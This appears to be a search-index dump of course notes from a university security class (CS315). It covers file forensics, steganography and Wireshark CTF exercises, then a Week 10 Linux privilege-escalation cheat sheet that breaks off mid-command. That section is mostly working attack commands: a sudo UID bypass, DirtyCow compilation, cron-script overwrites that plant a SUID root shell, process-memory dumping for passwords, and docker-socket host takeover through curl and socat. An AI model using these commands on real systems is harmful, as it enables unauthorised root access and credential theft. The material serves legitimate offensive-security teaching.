Mail Extensions or MIME type) is a standard that indicates the nature and format of a document, file, or assortment of bytes . It is defined and standardized in IETF's RFC 6838. This type is identified in HTTP packets and DO NOT stipulate the real file format. For example, a MIME type image/jpg means the transferred data LIKELY to be a JPEG image, but user can post a plain text or anything in real body.","title":"What about MIME?"},{"location":"CS315/Week%201/#example_1","text":"\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 \u2502 HTTP packe \u2502 \u2502 \u2502 \u2502 MIME:image/jpg \u2502 \u2502 \u2502 A \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \u250c\u2500\u2500\u2510 \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba B \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502flag.jpg \u2502 \u2502 \u2514\u2500\u252c\u2518 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u2502 \u25bc \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502GIF89a\\xc8\\x00 \u2502 \u2502\\x96\\x00\\xf7\\x00\u2502 \u2502... \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 The file signature is GIF8 while the file extension is .jpg , with the MIME type image/jpg during HTTP transmission. The given file is a GIF image instead of JPEG file.","title":"Example"},{"location":"CS315/Week%201/#metadata","text":"Metadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number and album.","title":"Metadata"},{"location":"CS315/Week%201/#what-kind-of-file-metadata-is-useful","text":"Potentially, any file metadata you can find could be useful.","title":"What kind of file metadata is useful?"},{"location":"CS315/Week%201/#how-do-i-find-it","text":"One of our favorite tools is exiftool, which displays metadata for an input file, including: - File size - Dimensions (width and height) - File type - Programs used to create (e.g. Photoshop) - OS used to create (e.g. Apple) Run command line: exiftool(-k).exe [filename] and you should see something like this:","title":"How do I find it?"},{"location":"CS315/Week%201/#example_2","text":"Let's take a look at File A's metadata with exiftool: File type Image description Make and camera info GPS Latitude/Longitude","title":"Example"},{"location":"CS315/Week%201/#timestamps","text":"Timestamps are data that indicate the time of certain events (MAC): - Modification \u2013 when a file was modified - Access \u2013 when a file or entries were read or accessed - Creation \u2013 when files or entries were created","title":"Timestamps"},{"location":"CS315/Week%201/#types-of-timestamps","text":"Modified Accessed Created Date Changed (MFT) Filename Date Created (MFT) Filename Date Modified (MFT) Filename Date Accessed (MFT) INDX Entry Date Created INDX Entry Date Modified INDX Entry Date Accessed INDX Entry Date Changed","title":"Types of timestamps"},{"location":"CS315/Week%201/#why-do-we-care","text":"Certain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created.","title":"Why do we care?"},{"location":"CS315/Week%201/#timeline-patterns","text":"There are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge.","title":"Timeline Patterns"},{"location":"CS315/Week%201/#examples","text":"We know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files? By using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA in a different way. Follow along as we demonstrate. We\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected. Here are the extracted MAC times for fileA, fileB, fileC and fileD: Note, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours, since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better. Highlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order. Identify timestamp patterns.","title":"Examples"},{"location":"CS315/Week%201/#wireshark","text":"Wireshark is a network protocol analyzer which is often used in CTF challenges to look at recorded network traffic. Wireshark uses a filetype called PCAP to record traffic. PCAPs are often distributed in CTF challenges to provide recorded traffic history.","title":"Wireshark"},{"location":"CS315/Week%201/#interface","text":"Upon opening Wireshark, you are greeted with the option to open a PCAP or begin capturing network traffic on your device. The network traffic displayed initially shows the packets in order of which they were captured. You can filter packets by protocol, source IP address, destination IP address, length, etc. In order to apply filters, simply enter the constraining factor, for example 'http', in the display filter bar. Filters can be chained together using '&&' notation. In order to filter by IP, ensure a double equals '==' is used. The most pertinent part of a packet is its data payload and protocol information.","title":"Interface"},{"location":"CS315/Week%201/#decrypting-ssl-traffic","text":"By default, Wireshark cannot decrypt SSL traffic on your device unless you grant it specific certificates.","title":"Decrypting SSL Traffic"},{"location":"CS315/Week%201/#high-level-ssl-handshake-overview","text":"In order for a network session to be encrypted properly, the client and server must share a common secret for which they can use to encrypt and decrypt data without someone in the middle being able to guess. The SSL Handshake loosely follows this format: The client sends a list of availble cipher suites it can use along with a random set of bytes referred to as client_random The server sends back the cipher suite that will be used, such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA, along with a random set of bytes referred to as server_random The client generates a pre-master secret, encrypts it, then sends it to the server. The server and client then generate a common master secret using the selected cipher suite The client and server begin communicating using this common secret","title":"High Level SSL Handshake Overview"},{"location":"CS315/Week%201/#decryption-requirements","text":"There are several ways to be able to decrypt traffic. If you have the client and server random values and the pre-master secret, the master secret can be generated and used to decrypt the traffic If you have the master secret, traffic can be decrypted easily If the cipher-suite uses RSA, you can factor n in the key in order to break the encryption on the encrypted pre-master secret and generate the master secret with the client and server randoms","title":"Decryption Requirements"},{"location":"CS315/Week%201/#steganography","text":"Steganography is the practice of hiding data in plain sight. Steganography is often embedded in images or audio. You could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it. You could also hide a second image inside the first.","title":"Steganography"},{"location":"CS315/Week%201/#steganography-detection","text":"So we can hide text and an image, how do we find out if there is hidden data? FileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it. FileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions: Can we determine that there is steganography in fileD? If there is, what was hidden in it?","title":"Steganography Detection"},{"location":"CS315/Week%201/#lsb-steganography","text":"File are made of bytes. Each byte is composed of eight bits. Changing the least-significant bit (LSB) doesn\u2019t change the value very much. So we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside.","title":"LSB Steganography"},{"location":"CS315/Week%201/#lsb-steganography-in-images","text":"LSB Steganography or Least Significant Bit Steganography is a method of Steganography where data is recorded in the lowest bit of a byte. Say an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like 1 1 1 1 1 1 1 1 By modifying the lowest, or least significant, bit, we can use the 1 bit space across every RGB value for every pixel to construct a message. 1 1 1 1 1 1 1 0 The reason Steganography is hard to detect by sight is because a 1 bit difference in color is insignificant as seen below.","title":"LSB Steganography in Images"},{"location":"CS315/Week%201/#example_3","text":"Let\u2019s say we have an image, and part of it contains the following binary: And let\u2019s say we want to hide the character y inside. First, we need to convert the hidden message to binary. Now we take each bit from the hidden message and replace the LSB of the corresponding byte with it. And again: And again: And again: And again: And again: And again: And once more: Decoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!)","title":"Example"},{"location":"CS315/Week%201/#what-other-types-of-steganography-are-there","text":"Steganography is hard for the defense side, because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples: - LSB steganography: different bits, different bit combinations - Encode in every certain number of bytes - Use a password - Hide in different places - Use encryption on top of steganography","title":"What other types of steganography are there?"},{"location":"CS315/Week%201/#blind-watermark","text":"Blind watermark is a kind of technique to embed one picture or string to another image. Just like the regular watermark, but the blind watermark cannot be detected by using human eyes. The transformed image is indistinguishable from the origin one. Furthermore, blind watermark should be able to bypass different types of processing of image. For example, rotating the picture should not broke the blind watermark. Some modern researches are focusing on the strong transform of the image, such like film the image from another screen.","title":"Blind Watermark"},{"location":"CS315/Week%201/#example_4","text":"","title":"Example"},{"location":"CS315/Week%201/#encode","text":"original image watermark python encode.py --image ori.png --watermark watermark.png --result res.png result","title":"encode:"},{"location":"CS315/Week%201/#decode","text":"python decode.py --original ori.png --image res.png --result extract.png watermark","title":"decode:"},{"location":"CS315/Week%201/#hex-editor","text":"A hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may used to correct data corrupted by a system or application. A list of editors can be found on the forensics Wiki. You can download one and install it on your system.","title":"Hex Editor"},{"location":"CS315/Week%201/#example_5","text":"Open fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile > Open\u201d option or a simple drag and drop.) When you open fileA.jpg in your hex editor, you should see something similar to this: Your hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte.","title":"Example"},{"location":"CS315/Week%201/#exercise","text":"Every lab we will have 2 or 3 challenges about the topics this week. But in case the difficulty of the challenge, only the first 2 challenges are required. But if you want to fight CTF so hard, you can try the third one. Solving the third one would give you extra points for this lab and some prizes as well. For finishing the challenges, you may click this site: COMPASS CTF Platform and find the category CS315 . Other challenges are for CTF team members, but you also can finish them freely. After uploading the flag on the platform, you also need to upload a writeup to blackboard system to grade. The writeup is a file to describe how you solve the challenges and you need also post flag in it. The writeup would use to grade and in case you forget to submit the writeup, during the argue procedure, we would check the submission in platform.","title":"Exercise"},{"location":"CS315/Week%201/#example-writeup","text":"(5 pt) Congratulations! Now in order to check whether you are a robot, you need to submit this flag to show that you are a real human! flag{w31com3_t0_CS315_c0Urs3!!!} The flag you submit should be flag{w31com3_t0_CS315_c0Urs3!!!} , and the example writeup probably be: Writeup.md I am a human so I copied the flag and submit it. Here is the flag: flag{w31com3_t0_CS315_c0Urs3!!!}","title":"Example writeup"},{"location":"CS315/Week%201/#5-pt-what-is-so-called-stream","text":"The network is so bad that I can't even send TCP stream through Internet. Wondering if I can use \"UDP streams\"... capture.pcap Try to find flag in this file, the flag format is: picoCTF{***} Hint1: Wireshark may be useful.","title":"(5 pt) What is so called stream?"},{"location":"CS315/Week%201/#5-pt-https-with-secret-sauce","text":"Solved the network problem yesterday, but I found some guy was sniffing my network traffic. I need to be careful to protect my flag. Decide to use HTTPS to submit my flag to web01.fruitinc.xyz . By the way, upload my super\u2606secret\u2606file to network disk. capture.pcapng pre-master secret.txt Try to find flag in this file, the flag format is: flag{y2***}","title":"(5 pt) HTTPS with secret sauce"},{"location":"CS315/Week%201/#bonus-5-pt-bytes-through-network","text":"That hacker still got my flag! Fine, I'm going to send my file byte by byte. Besides, combined with my knowledge of programming, encryption, and stenography I'm going to fight the final round. WE ARE IN THE ENDGAME NOW. capture.pcapng Try to find flag in this file, the flag format is: flag{***} This challenge is extremely hard. The winner will get a badge for solving this.","title":"(BONUS 5 pt) Bytes through network"},{"location":"CS315/Week%2010/","text":"Week10 PWN: Privilege Escalation System Information OS info Let's starting gaining some knowledge of the OS running (cat /proc/version || uname -a ) 2>/dev/null lsb_release -a 2>/dev/null Path If you have write permissions on any folder inside the PATH variable you may be able to hijacking some libraries or binaries: echo $PATH Env info Interesting information, passwords or API keys in the environment variables? (env || set) 2>/dev/null Kernel exploits Check the kernel version and if there is some exploit that can be used to escalate privileges cat /proc/version uname -a searchsploit \"Linux Kernel\" You can find a good vulnerable kernel list and some already compiled exploits here: https://github.com/lucyoa/kernel-exploits and exploitdb sploits . Other sites where you can find some compiled exploits : https://github.com/bwbwbwbw/linux-exploit-binaries, https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack To extract all the vulnerable kernel versions from that web you can do: curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep \"Kernels: \" | cut -d \":\" -f 2 | cut -d \"<\" -f 1 | tr -d \",\" | tr ' ' '\\n' | grep -v \"^\\d\\.\\d$\" | sort -u -r | tr '\\n' ' ' Tools that could help searching for kernel exploits are: linux-exploit-suggester.sh linux-exploit-suggester2.pl linuxprivchecker.py (execute IN victim,only checks exploits for kernel 2.x) Always search the kernel version in Google , maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid. CVE-2016-5195 (DirtyCow) Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 # make dirtycow stable echo 0 > /proc/sys/vm/dirty_writeback_centisecs g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c Sudo version Based on the vulnerable sudo versions that appear in: searchsploit sudo You can check if the sudo version is vulnerable using this grep. sudo -V | grep \"Sudo ver\" | grep \"1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]\" sudo <= v1.28 From @sickrov sudo -u#-1 /bin/bash Dmesg signature verification failed Check smasher2 box of HTB for an example of how this vuln could be exploited dmesg 2>/dev/null | grep \"signature\" More system enumeration date 2>/dev/null #Date (df -h || lsblk) #System stats lscpu #CPU info lpstat -a 2>/dev/null #Printers info Enumerate possible defenses AppArmor if [ `which aa-status 2>/dev/null` ]; then aa-status elif [ `which apparmor_status 2>/dev/null` ]; then apparmor_status elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then ls -d /etc/apparmor* else echo \"Not found AppArmor\" fi Grsecurity ((uname -r | grep \"\\-grsec\" >/dev/null 2>&1 || grep \"grsecurity\" /etc/sysctl.conf >/dev/null 2>&1) && echo \"Yes\" || echo \"Not found grsecurity\") PaX (which paxctl-ng paxctl >/dev/null 2>&1 && echo \"Yes\" || echo \"Not found PaX\") Execshield (grep \"exec-shield\" /etc/sysctl.conf || echo \"Not found Execshield\") SElinux (sestatus 2>/dev/null || echo \"Not found sestatus\") ASLR cat /proc/sys/kernel/randomize_va_space 2>/dev/null #If 0, not enabled Docker Breakout If you are inside a docker container you can try to escape from it: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout Drives Check what is mounted and unmounted , where and why. If anything is unmounted you could try to mount it and check for private info ls /dev 2>/dev/null | grep -i \"sd\" cat /etc/fstab 2>/dev/null | grep -v \"^#\" | grep -Pv \"\\W*\\#\" 2>/dev/null #Check if credentials in fstab grep -E \"(user|username|login|pass|password|pw|credentials)[=:]\" /etc/fstab /etc/mtab 2>/dev/null Installed Software Useful software Enumerate useful binaries which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null Also, check if any compiler is installed . This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it (or in one similar) (dpkg --list 2>/dev/null | grep \"compiler\" | grep -v \"decompiler\\|lib\" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r \"/gcc[0-9\\.-]\\+$\" 2>/dev/null | grep -v \"/doc/\") Vulnerable Software Installed Check for the version of the installed packages and services . Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges\u2026 It is recommended to check manually the version of the more suspicious installed software. dpkg -l #Debian rpm -qa #Centos If you have SSH access to the machine you could also use openVAS to check for outdated and vulnerable software installed inside the machine. Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits Processes Take a look to what processes are being executed and check if any process has more privileges that it should (maybe a tomcat being executed by root?) ps aux ps -ef top -n 1 Always check for possible electron/cef/chromium debuggers running, you could abuse it to escalate privileges . Linpeas detect those by checking the --inspect parameter inside the command line of the process. Also check your privileges over the processes binaries , maybe you can overwrite someone. Process monitoring You can use tools like pspy to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met. Process memory Some services of a server save credentials in clear text inside the memory . Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials. However, remember that as a regular user you can read the memory of the processes you own . GDB If you have access to the memory of a FTP service (for example) you could get the Heap and search inside of it the credentials. gdb -p <FTP_PROCESS_PID> (gdb) info proc mappings (gdb) q (gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD> (gdb) q strings /tmp/mem_ftp #User and password GDB Script #!/bin/bash #./dump-memory.sh <PID> grep rw-p /proc/$1/maps \\ | sed -n 's/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p' \\ | while read start stop; do \\ gdb --batch --pid $1 -ex \\ \"dump memory $1-$start-$stop.dump 0x$start 0x$stop\"; \\ done /proc/$pid/maps & /proc/$pid/mem For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region . The mem pseudo file exposes the processes memory itself . From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file. procdump() ( cat /proc/$1/maps | grep -Fv \".so\" | grep \" 0 \" | awk '{print $1}' | ( IFS=\"-\" while read a b; do dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \\ skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of=\"$1_mem_$a.bin\" done ) cat $1*.bin > $1.dump rm $1*.bin ) /dev/mem /dev/mem provides access to the system's physical memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem. Typically, /dev/mem is only readable by root and kmem group. strings /dev/mem -n10 | grep -i PASS Tools To dump a process memory you could use: https://github.com/hajzer/bash-memory-dump (root) - You can manually remove root requirements and dump process owned by you Script A.5 from https://www.delaat.net/rp/2016-2017/p97/report.pdf (root is required) Credentials from Process Memory Manual example If you find that the authenticator process is running: ps -ef | grep \"authenticator\" root 2027 2025 0 11:46 ? 00:00:00 authenticator You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory: ./dump-memory.sh 2027 strings *.dump | grep -i password mimipenguin The tool https://github.com/huntergregal/mimipenguin will steal clear text credentials from memory and from some well known files . It requires root privileges to work properly. Feature Process Name GDM password (Kali Desktop, Debian Desktop) gdm-password Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) gnome-keyring-daemon LightDM (Ubuntu Desktop) lightdm VSFTPd (Active FTP Connections) vsftpd Apache2 (Active HTTP Basic Auth Sessions) apache2 OpenSSH (Active SSH Sessions - Sudo Usage) sshd: Scheduled/Cron jobs Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?). crontab -l ls -al /etc/cron* /etc/at* cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v \"^#\" Cron path For example, inside /etc/crontab you can find the PATH: PATH= /home/user :/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin ( Note how the user \"user\" has writing privileges over /home/user ) If inside this crontab the root user tries to execute some command or script without setting the path. For example: root overwrite.sh Then, you can get a root shell by using: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh #Wait cron job to be executed /tmp/bash -p #The effective uid and gid to be set to the real uid and gid Cron using a script with a wildcard (Wildcard Injection) If a script being executed by root has a \u201c * \u201d inside a command, you could exploit this to make unexpected things (like privesc). Example: rsync -a *.sh rsync://host.back/src/rbd #You can create a file called \"-e sh myscript.sh\" so the script will execute our script If the wildcard is preceded of a path like /some/path/* , it's not vulnerable (even ./* is not). Read the following page for more wildcard exploitation tricks: https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks Cron script overwriting and symlink If you can modify a cron script executed by root, you can get a shell very easily: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT> #Wait until it is executed /tmp/bash -p If the script executed by root uses a directory where you have full access , maybe it could be useful to delete that folder and create a symlink folder to another one serving a script controlled by you ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER> Frequent cron jobs You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges. For example, to monitor every 0.1s during 1 minute , sort by less executed commands and deleting the commands that have beeing executed all the time, you can do: for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v \"\\[\" | sed '/^.\\{200\\}./d' | sort | grep -E -v \"\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]\"; rm /tmp/monprocs.tmp; You can also use pspy (this will monitor and list every process that start). Invisible cron jobs It's possible to create a cronjob putting a carriage return after a comment (without new line character), and the cron job will work. Example (note the carriege return char): #This is a comment inside a cron config file\\r* * * * * echo \"Surprise!\" Services Writable .service files Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started , restarted or stopped (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with ExecStart=/tmp/script.sh Writable service binaries Keep in mid that if you have write permissions over binaries being executed by services , you can change them for backdoors so when the services get re-executed the backdoors will be executed. systemd PATH - Relative Paths You can see the PATH used by systemd with: systemctl show-environment If you find that you can write in any of the folders of the path you may be able to escalate privileges . You need to search for relative paths being used on service configurations files like: ExecStart=faraday-server ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I' ExecStop=/bin/sh \"uptux-vuln-bin3 -stuff -hello\" Then, create a executable with the same name as the relative path binary inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action ( Start , Stop , Reload ), your backdoor will be executed (unprivileged users usually cannot start/stop services but check if you can using sudo -l ). Learn more about services with man systemd.service . Timers Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron. Timers have built-in support for calendar time events, monotonic time events, and can be run asynchronously. You can enumerate all the timers doing: systemctl list-timers --all Writable timers If you can modify a timer you can make it execute some existent systemd.unit (like a .service or a .target ) Unit=backdoor.service In the documentation you can read what the Unit is: The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not \".timer\". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix. Therefore, in order to abuse this permissions you would need to: Find some systemd unit (like a .service ) that is executing a writable binary Find some systemd unit that is executing a relative path and you have writable privileges over the systemd PATH (to impersonate that executable) Learn more about timers with man systemd.timer . Enabling Timer In order to enable a timer you need root privileges and to execute: sudo systemctl enable backu2.timer Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer \u2192 /lib/systemd/system/backu2.timer. Note the timer is activated by creating a symlink to it on /etc/systemd/system/<WantedBy_section>.wants/<name>.timer Sockets In brief, a Unix Socket (technically, the correct name is Unix domain socket, UDS ) allows communication between two different processes on either the same machine or different machines in client-server application frameworks. To be more precise, it\u2019s a way of communicating among computers using a standard Unix descriptors file. (From here ). Sockets can be configured using .socket files. Learn more about sockets with man systemd.socket . Inside this file some several interesting parameters can be configured: ListenStream , ListenDatagram , ListenSequentialPacket , ListenFIFO , ListenSpecial , ListenNetlink , ListenMessageQueue , ListenUSBFunction : This options are different but as summary as used to indicate where is going to listen the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen...). Accept : Takes a boolean argument. If true , a service instance is spawned for each incoming connection and only the connection socket is passed to it. If false , all listening sockets themselves are passed to the started service unit , and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. Defaults to false . For performance reasons, it is recommended to write new daemons only in a way that is suitable for Accept=no . ExecStartPre , ExecStartPost : Takes one or more command lines, which are executed before or after the listening sockets /FIFOs are created and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process. ExecStopPre , ExecStopPost : Additional commands that are executed before or after the listening sockets /FIFOs are closed and removed, respectively. Service : Specifies the service unit name to activate on incoming traffic . This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option. Writable .socket files If you find a writable .socket file you can add at the beginning of the [Socket] section something like: ExecStartPre=/home/kali/sys/backdoor and the backdoor will be executed before the socket is created. Therefore, you will probably need to wait until the machine is rebooted. Note that the system must be using that socket file configuration or the backdoor won't be executed Writable sockets If you identify any writable socket ( now where are talking about Unix Sockets, not about the config .socket files ), then, you can communicate with that socket and maybe exploit a vulnerability. Enumerate Unix Sockets netstat -a -p --unix Raw connection #apt-get install netcat-openbsd nc -U /tmp/socket #Connect to UNIX-domain stream socket nc -uU /tmp/socket #Connect to UNIX-domain datagram socket #apt-get install socat socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type Exploitation example: https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection HTTP sockets Note that there may be some sockets listening for HTTP requests ( I'm not talking about .socket files but about the files acting as unix sockets ). You can check this with: curl --max-time 2 --unix-socket /pat/to/socket/files http:/index If the socket respond with a HTTP request, then you can communicate with it and maybe exploit some vulnerability . Writable Docker Socket The docker socke t is typically located at /var/run/docker.sock and is only writable by root user and docker group. If for some reason you have write permissions over that socket you can escalate privileges. The following commands can be used to escalate privileges: docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh Use docker web API from socket without docker package If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with curl . The following commands are a example to create a docker container that mount the root of the host system and use socat to execute commands into the new docker. # List docker images curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json ##[{\"Containers\":-1,\"Created\":1588544489,\"Id\":\"sha256:<ImageID>\",...}] # Send JSON to docker API to create the container curl -XPOST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock -d '{\"Image\":\"<ImageID>\",\"Cmd\":[\"/bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host_root\"}]}' http://localhost/containers/create ##{\"Id\":\"<NewContainerID>\",\"Warnings\":[]} curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start The last step is to use socat to initiate a connection to the container, sending an attach request socat - UNIX-CONNECT:/var/run/docker.sock POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1 Host: Connection: Upgrade Upgrade: tcp #HTTP/1.1 101 UPGRADED #Content-Type: application/vnd.docker.raw-stream #Connection: Upgrade #Upgrade: tcp Now, you can execute commands on the container from this socat connection. Others Note that if you have write permissions over the docker socket because you are inside the group docker you have more ways to escalate privileges . If the docker API is listening in a port you can also be able to compromise it . Containerd (ctr) privilege escalation If you find that you can use the ctr command read the following page as you may be able to abuse it to escalate privileges : https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation RunC privilege escalation If you find that you can use the runc command read the following page as you may be able to abuse it to escalate privileges : https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation D-Bus D-BUS is an inter-process communication (IPC) system , providing a simple yet powerful mechanism allowing applications to talk to one another , communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system. D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another\u2014think UNIX domain sockets on steroids . Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object\u2014think CORBA without the complications. (From here ). D-Bus uses an allow/deny model , where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the own , send_destination or receive_sender attribute set. Part of the policy of /etc/dbus-1/system.d/wpa_supplicant.conf : <policy user=\"root\"> <allow own=\"fi.w1.wpa_supplicant1\"/> <allow send_destination=\"fi.w1.wpa_supplicant1\"/> <allow send_interface=\"fi.w1.wpa_supplicant1\"/> <allow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/> </policy> Therefore, if a policy is allowing your user in anyway to interact with the bus , you could be able to exploit it to escalate privileges (maybe just listing for some passwords?). Note that a policy that doesn't specify any user or group affects everyone ( <policy> ). Policies to the context \"default\" affects everyone not affected by other policies ( <policy context=\"default\" ). Learn how to enumerate and exploit a D-Bus communication here: https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation Network It's always interesting to enumerate the network and figure out the position of the machine. Generic enumeration #Hostname, hosts and DNS cat /etc/hostname /etc/hosts /etc/resolv.conf dnsdomainname #Content of /etc/inetd.conf & /etc/xinetd.conf cat /etc/inetd.conf /etc/xinetd.conf #Interfaces cat /etc/networks (ifconfig || ip a) #Neighbours (arp -e || arp -a) (route || ip n) #Iptables rules (timeout 1 iptables 